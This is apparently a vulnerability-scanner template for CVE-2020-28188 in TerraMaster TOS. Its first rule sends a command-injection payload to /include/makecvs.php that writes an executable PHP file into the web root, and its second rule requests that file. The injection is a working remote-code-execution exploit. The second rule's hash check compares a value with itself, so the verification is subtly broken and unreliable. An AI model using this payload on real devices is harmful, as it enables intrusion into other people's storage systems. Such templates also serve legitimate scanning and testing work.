name: yaml-poc-terra_master-tos-unauthorized_access-CVE-2020-28188
binding: 4b9ed498-8e2b-4353-8c61-60449282e257
detail:
    author: system_user
    links:
        - http://packetstormsecurity.com/files/172880/TerraMaster-TOS-4.2.06-Remote-Code-Execution.html
        - https://nvd.nist.gov/vuln/detail/CVE-2020-28188
        - https://research.checkpoint.com/2021/freakout-leveraging-newest-vulnerabilities-for-creating-a-botnet/
        - https://www.huawei.com/cn/psirt/security-notices/huawei-sn-20210120-01-liferay-cn
        - https://www.ihteam.net/advisory/terramaster-tos-multiple-vulnerabilities/
        - https://www.terra-master.com/
    vulnerability:
        id: 8bfa67b4-6cba-4b4e-8e6b-0d9d69379e2b
        level: critical
transport: http
set:
    r2: randomLowercase(10)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /include/makecvs.php?Event=http|echo%20"<?php%20echo%20md5({{r2}});unlink(__FILE__);?>"%20>>%20/usr/www/{{r2}}.php%20&&%20chmod%20755%20/usr/www/{{r2}}.php||
            follow_redirects: false
        expression: response.body.bcontains(bytes("Service,DateTime")) && response.status == 200 && "text/csv" in response.headers
    r1:
        request:
            cache: true
            method: GET
            path: /{{r2}}.php
            follow_redirects: false
        expression: response.status == 200 && md5(r2).contains(md5(r2))
expression: r0() && r1()
